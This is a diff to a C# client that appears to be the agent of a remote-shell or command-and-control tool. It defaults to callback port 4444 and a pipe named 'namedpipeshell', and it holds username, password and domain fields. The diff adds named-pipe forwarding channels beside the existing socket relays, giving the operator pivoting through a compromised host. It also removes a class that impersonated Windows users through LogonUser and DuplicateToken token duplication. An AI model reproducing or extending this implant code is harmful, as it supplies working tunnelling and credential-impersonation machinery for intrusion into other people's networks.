@@ -23,15 +23,24 @@ namespace myclient
     {
         private string t_message = "";
         private string t_pipe_message = "";
-        private Dictionary <Guid,Socket> fwSocket = new Dictionary<Guid, Socket>();
-        private Dictionary <Guid,bool> fwSocket_alive = new Dictionary<Guid, bool>();
-        private Dictionary <string, bool> rh_running = new Dictionary<string, bool>();
-        private Dictionary <string, List<Guid>> fwMapping = new Dictionary<string, List<Guid>>();
-        private Dictionary <Guid, string> fwMapping_revs = new Dictionary<Guid, string>();
-        private Dictionary <Guid, bool> ifAcked = new Dictionary<Guid, bool>();
+        private Dictionary<Guid, Socket> fwSocket = new Dictionary<Guid, Socket>();
+        private Dictionary<Guid, bool> fwSocket_alive = new Dictionary<Guid, bool>();
+        private Dictionary<string, bool> rh_running = new Dictionary<string, bool>();
+        private Dictionary<string, List<Guid>> fwMapping = new Dictionary<string, List<Guid>>();
+        private Dictionary<Guid, string> fwMapping_revs = new Dictionary<Guid, string>();
+        private Dictionary<Guid, bool> ifAcked = new Dictionary<Guid, bool>();
 
-        private Dictionary <string,string> fwEndPoint = new Dictionary<string, string>();
-        
+        private Dictionary<Guid, PipeStream> fwPipe = new Dictionary<Guid, PipeStream>();
+        private Dictionary<Guid, bool> fwPipe_alive = new Dictionary<Guid, bool>();
+        //private Dictionary<Guid, bool> fwSocket_alive = new Dictionary<Guid, bool>();
+        //private Dictionary<string, bool> rh_running = new Dictionary<string, bool>();
+        //private Dictionary<string, List<Guid>> fwMapping = new Dictionary<string, List<Guid>>();
+        //private Dictionary<Guid, string> fwMapping_revs = new Dictionary<Guid, string>();
+        //private Dictionary<Guid, bool> ifAcked = new Dictionary<Guid, bool>();
+
+
+        private Dictionary<string, string> fwEndPoint = new Dictionary<string, string>();
+
         public string ipstring = "127.0.0.1:4444";
         public string namepipestring = "namedpipeshell";
         public string namepipehost = ".";
@@ -39,6 +48,8 @@ namespace myclient
         public string username = "";
         public string password = "";
         public string domain = "";
+
+        private string fwnamepipe = "fwpipe";
 
         public static IEnumerable<string> SplitByLength(string str, int maxLength)
         {
@@ -106,12 +117,12 @@ namespace myclient
 
             while (true)
             {
-                
+
                 if (t_message.IndexOf(MsgTag_St) >= 0 && t_message.IndexOf(MsgTag_Ed) >= 0)
                 {
 
                     Console.WriteLine("[DEBUG] t_message: " + t_message);
-                    
+
                     int st_tag = t_message.IndexOf(MsgTag_St);
                     int ed_tag = t_message.IndexOf(MsgTag_Ed);
 
@@ -138,10 +149,9 @@ namespace myclient
         public string doReciveNative(Guid myuuid) //assume connected
         {
             var socket = fwSocket[myuuid];
-            //var socket_alive = fwSocket_alive[myuuid];
+            
             byte[] fwq_bytes_toresv = new byte[1024];
             string ret_str = "";
-            //Console.WriteLine("timeout: " + socket.ReceiveTimeout.ToString());
             Console.WriteLine("blocking: " + socket.Blocking.ToString());
 
             while (true)
@@ -163,7 +173,7 @@ namespace myclient
                 {
                     Console.WriteLine("SocketException: " + se.ToString());
                     Console.WriteLine("SocketErrorcode: " + se.SocketErrorCode.ToString());
-                    
+
                     if (se.SocketErrorCode == SocketError.WouldBlock) //no data this time
                     {
                         if (socket.Available == 1) //still some more, keep getting it
@@ -217,7 +227,7 @@ namespace myclient
                 }//end of catch
             }//end of while
         }
-        
+
         private string ReadPipMessage(PipeStream pipe)
         {
             byte[] buffer = new byte[1024];
@@ -233,7 +243,7 @@ namespace myclient
                     if (t_pipe_message.IndexOf(MsgTag_St) >= 0 && t_pipe_message.IndexOf(MsgTag_Ed) >= 0)
                     {
                         Console.WriteLine("[DEBUG] t_message: " + t_pipe_message);
-                        
+
                         int st_tag = t_pipe_message.IndexOf(MsgTag_St);
                         int ed_tag = t_pipe_message.IndexOf(MsgTag_Ed);
 
@@ -261,7 +271,55 @@ namespace myclient
                     }
 
                 }
-                
+
+            }
+        }
+
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        static extern bool PeekNamedPipe(SafeHandle handle, byte[] buffer, uint nBufferSize, ref uint bytesRead, ref uint bytesAvail, ref uint BytesLeftThisMessage);
+
+        static bool SomethingToRead(SafeHandle streamHandle)
+        {
+            byte[] aPeekBuffer = new byte[1];
+            uint aPeekedBytes = 0;
+            uint aAvailBytes = 0;
+            uint aLeftBytes = 0;
+
+            bool aPeekedSuccess = PeekNamedPipe(
+                streamHandle,
+                aPeekBuffer, 1,
+                ref aPeekedBytes, ref aAvailBytes, ref aLeftBytes);
+
+            if (aPeekedSuccess && aPeekBuffer[0] != 0)
+                return true;
+            else
+                return false;
+        }
+
+
+        private string ReadPipMessageNative(Guid myuuid)
+        {
+            byte[] buffer = new byte[1024];
+            var pipe = fwPipe[myuuid];
+            
+            if (SomethingToRead(pipe.SafePipeHandle)){
+                using (var ms = new MemoryStream())
+                {
+                    do
+                    {
+                        var readBytes = pipe.Read(buffer, 0, buffer.Length);
+                        ms.Write(buffer, 0, readBytes);
+
+                    }
+                    while (!pipe.IsMessageComplete);
+
+                    return Encoding.UTF8.GetString(ms.ToArray());
+                }
+            }
+            else
+            {
+                return "";
             }
         }
 
@@ -581,13 +639,25 @@ namespace myclient
                     {
                         //assume command is rhuuid:ip:port string
                         string[] subs = command.Split(':');
-                        fwEndPoint.Add(subs[0], subs[1] + ':' + subs[2]);
-                        //Console.WriteLine("subs[0]: " + subs[0]);
-                        //Console.WriteLine("subs[1]: " + subs[1]);
-                        //Console.WriteLine("subs[2]: " + subs[2]);
+                        if (subs[0] == "socket")
+                        {
+                            fwEndPoint.Add(subs[1], subs[2] + ':' + subs[3]);
+                            Thread t = new Thread(new ParameterizedThreadStart(StartServerNative));
+                            t.Start(subs[1]);
+                        }
+                        else
+                        {
+                            fwnamepipe = subs[2];
+                            Thread t = new Thread(new ParameterizedThreadStart(StartNativePipServer));
+                            t.Start(subs[1]);
+                        }
+                        
 
-                        Thread t = new Thread(new ParameterizedThreadStart(StartServerNative));
-                        t.Start(subs[0]);
+                        //Console.WriteLine("subs[0]: " + subs[0]); //type
+                        //Console.WriteLine("subs[1]: " + subs[1]); //uuid
+                        //Console.WriteLine("subs[2]: " + subs[2]); //pipename or ip if socket
+                        //Console.WriteLine("subs[3]: " + subs[3]); //port if socket
+
                         Console.WriteLine("[DEBUG] fw executed ...");
                         msg = Encoding.UTF8.GetBytes(MsgPack("FW_SUCCESS"));
                         bytesSent = sender.Send(msg);
@@ -603,14 +673,7 @@ namespace myclient
                     {
                         string rhuuid = command;
                         bool found = false;
-                        //Console.WriteLine("rhuuid: " + rhuuid);
-                        //Console.WriteLine("=========print the listener_running =========");
-                        //foreach (KeyValuePair<string, bool> test in listener_running)
-                        //{
-                        //    Console.WriteLine("Key = {0}, Value = {1}", test.Key, test.Value);
-                        //}
-                        //Console.WriteLine("=========print the listener_running =========");
-
+                        
                         if (rh_running.ContainsKey(rhuuid))
                         {
                             Console.WriteLine("rhuuid found ...");
@@ -639,16 +702,30 @@ namespace myclient
                                         Console.WriteLine("[DEBUG] Something wrong with send"); //should never happen
                                     }
 
-                                    //do single read and write
-                                    Console.WriteLine("Doing read and write");
-                                    string str_fwq_msg = doReciveNative(chuuid);
-                                    if (str_fwq_msg.Length == 0 && fwSocket_alive[chuuid] == false)
+                                    string str_fwq_msg = "";
+                                    if (fwSocket.ContainsKey(chuuid))
                                     {
-                                        str_fwq_msg = "FW_CH_FINED";
+                                        //do single read and write
+                                        Console.WriteLine("Doing read and write");
+                                        str_fwq_msg = doReciveNative(chuuid);
+                                        if (str_fwq_msg.Length == 0 && fwSocket_alive[chuuid] == false)
+                                        {
+                                            str_fwq_msg = "FW_CH_FINED";
+                                        }
+                                        if (str_fwq_msg.Length == 0 && fwSocket_alive[chuuid] == true)
+                                        {
+                                            str_fwq_msg = "FW_CH_NODATA";
+                                        }
                                     }
-                                    if (str_fwq_msg.Length == 0 && fwSocket_alive[chuuid] == true)
+                                    else
                                     {
-                                        str_fwq_msg = "FW_CH_NODATA";
+                                        //pipe channel 
+                                        Console.WriteLine("Doing read and write");
+                                        str_fwq_msg = ReadPipMessageNative(chuuid);
+                                        if (str_fwq_msg.Length == 0)
+                                        {
+                                            str_fwq_msg = "FW_CH_NODATA";
+                                        }
                                     }
 
                                     Console.WriteLine("read and writed Finished ...");
@@ -664,53 +741,70 @@ namespace myclient
 
                                     Console.WriteLine("Send success ...");
 
-
-                                    if (str_fwq_msg != "FW_CH_FINED") //no send back if FW_CH_FINED
+                                    if (fwSocket.ContainsKey(chuuid))
                                     {
-                                        string fwq_string_tosend = doRecive(sender);
-                                        Console.WriteLine("Got reponse: " + fwq_string_tosend);
-                                        if (fwSocket_alive[chuuid] && fwq_string_tosend.Length !=0)
+                                        if (str_fwq_msg != "FW_CH_FINED") //no send back if FW_CH_FINED
                                         {
-                                            //send will block
-                                            fwSocket[chuuid].Blocking = true;
-                                            int length_tosend = fwSocket[chuuid].Send(Encoding.UTF8.GetBytes(fwq_string_tosend));
-                                            fwSocket[chuuid].Blocking = false;
-                                            Console.WriteLine("Response sent");
-                                        }
-                                        else if(fwSocket_alive[chuuid] && fwq_string_tosend.Length == 0)
-                                        {
-                                            Console.WriteLine("Dummy Response ...");
-                                        }
-                                        else
-                                        {
-                                            Console.WriteLine("fwSocket may still receiving ... ");
-                                            if (SocketConnected(fwSocket[chuuid]))
+                                            string fwq_string_tosend = doRecive(sender);
+                                            Console.WriteLine("Got reponse: " + fwq_string_tosend);
+                                            if (fwSocket_alive[chuuid] && fwq_string_tosend.Length != 0)
                                             {
-                                                Console.WriteLine("fwSocket still connected ... ");
                                                 //send will block
                                                 fwSocket[chuuid].Blocking = true;
                                                 int length_tosend = fwSocket[chuuid].Send(Encoding.UTF8.GetBytes(fwq_string_tosend));
                                                 fwSocket[chuuid].Blocking = false;
                                                 Console.WriteLine("Response sent");
                                             }
+                                            else if (fwSocket_alive[chuuid] && fwq_string_tosend.Length == 0)
+                                            {
+                                                Console.WriteLine("Dummy Response ...");
+                                            }
                                             else
                                             {
-                                                Console.WriteLine("fwSocket does not want response ... ");
+                                                Console.WriteLine("fwSocket may still receiving ... ");
+                                                if (SocketConnected(fwSocket[chuuid]))
+                                                {
+                                                    Console.WriteLine("fwSocket still connected ... ");
+                                                    //send will block
+                                                    fwSocket[chuuid].Blocking = true;
+                                                    int length_tosend = fwSocket[chuuid].Send(Encoding.UTF8.GetBytes(fwq_string_tosend));
+                                                    fwSocket[chuuid].Blocking = false;
+                                                    Console.WriteLine("Response sent");
+                                                }
+                                                else
+                                                {
+                                                    Console.WriteLine("fwSocket does not want response ... ");
+                                                }
+
+                                                fwSocket[chuuid].Shutdown(SocketShutdown.Send);
+                                                fwSocket[chuuid].Close(1000);
                                             }
 
-                                            fwSocket[chuuid].Shutdown(SocketShutdown.Send);
-                                            fwSocket[chuuid].Close(1000);
+                                        }
+                                        else
+                                        {
+                                            Console.WriteLine("Clean up ...");
+                                            fwSocket[chuuid].Shutdown(SocketShutdown.Both);
+                                            fwSocket[chuuid].Close();
+                                        }
+                                    }
+                                    else //pipe
+                                    {
+                                        string fwq_string_tosend = doRecive(sender);
+                                        Console.WriteLine("Got reponse: " + fwq_string_tosend);
+
+                                        if (fwq_string_tosend.Length != 0)
+                                        {
+                                            msg = Encoding.UTF8.GetBytes(fwq_string_tosend);
+                                            fwPipe[chuuid].Write(msg, 0, msg.Length);
+                                            Console.WriteLine("Response sent");
+                                        }
+                                        else
+                                        {
+                                            Console.WriteLine("Dummy Response ...");
                                         }
 
                                     }
-                                    else
-                                    {
-                                        Console.WriteLine("Clean up ...");
-                                        fwSocket[chuuid].Shutdown(SocketShutdown.Both);
-                                        fwSocket[chuuid].Close();
-                                    }
-                                    
-                                    
 
                                     break;
 
@@ -1266,102 +1360,38 @@ namespace myclient
 
         }
 
-
-    }
-
-
-    class Impersonator
-        
-    {
-
-        [DllImport("advapi32.dll", SetLastError = true)]
-        private static extern int LogonUser(
-            string lpszUserName,
-            string lpszDomain,
-            string lpszPassword,
-            int dwLogonType,
-            int dwLogonProvider,
-            ref IntPtr phToken);
-
-        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-        private static extern int DuplicateToken(
-            IntPtr hToken,
-            int impersonationLevel,
-            ref IntPtr hNewToken);
-
-        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-        private static extern bool RevertToSelf();
-
-        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
-        private static extern bool CloseHandle(
-            IntPtr handle);
-
-        private const int LOGON32_LOGON_INTERACTIVE = 2;
-        private const int LOGON32_LOGON_NEW_CREDENTIALS = 9;
-        private const int LOGON32_PROVIDER_DEFAULT = 0;
-
-
-        public void ImpersonateValidUser(
-            string userName,
-            string domain,
-            string password)
+        public void StartNativePipServer(Object uuid)
         {
-            WindowsIdentity tempWindowsIdentity = null;
-            IntPtr token = IntPtr.Zero;
-            IntPtr tokenDuplicate = IntPtr.Zero;
+
+            string rhuuid = (string)uuid;
 
             try
             {
-                if (RevertToSelf())
-                {
-                    if (LogonUser(userName, domain, password, LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_DEFAULT, ref token) != 0)
-                    {
-                        if (DuplicateToken(token, 2, ref tokenDuplicate) != 0)
-                        {
-                            tempWindowsIdentity = new WindowsIdentity(tokenDuplicate);
-                            impersonationContext = tempWindowsIdentity.Impersonate();
-                        }
-                        else
-                        {
-                            Console.WriteLine("DuplicateToken Failed");
-                        }
-                    }
-                    else
-                    {
-                        Console.WriteLine("LogonUser Failed");
-                    }
-                }
-                else
-                {
-                    Console.WriteLine("RevertToSelf Failed");
-                }
-            }
+                rh_running.Add(rhuuid, true);
+                fwMapping.Add(rhuuid, new List<Guid>());
 
-            finally
+                var pipe = new NamedPipeServerStream(fwnamepipe, PipeDirection.InOut, NamedPipeServerStream.MaxAllowedServerInstances, PipeTransmissionMode.Message);
+                
+                pipe.WaitForConnection();
+                Guid myuuid = Guid.NewGuid();
+                //t_fwSocket.ReceiveTimeout = localSocketTimeout;
+                fwPipe.Add(myuuid, pipe);
+                fwPipe_alive.Add(myuuid, true);
+
+                fwMapping[rhuuid].Add(myuuid);
+                fwMapping_revs.Add(myuuid, rhuuid);
+
+                ifAcked.Add(myuuid, false);
+
+
+            }//end of try
+            catch (Exception e)
             {
-                if (token != IntPtr.Zero)
-                {
-                    CloseHandle(token);
-                }
-                if (tokenDuplicate != IntPtr.Zero)
-                {
-                    CloseHandle(tokenDuplicate);
-                }
+                Console.WriteLine(e.ToString());
             }
         }
-
-
-        public void UndoImpersonation()
-        {
-            if (impersonationContext != null)
-            {
-                impersonationContext.Undo();
-            }
-        }
-
-        private WindowsImpersonationContext impersonationContext = null;
-
     }
+
 
     public class Program
     {
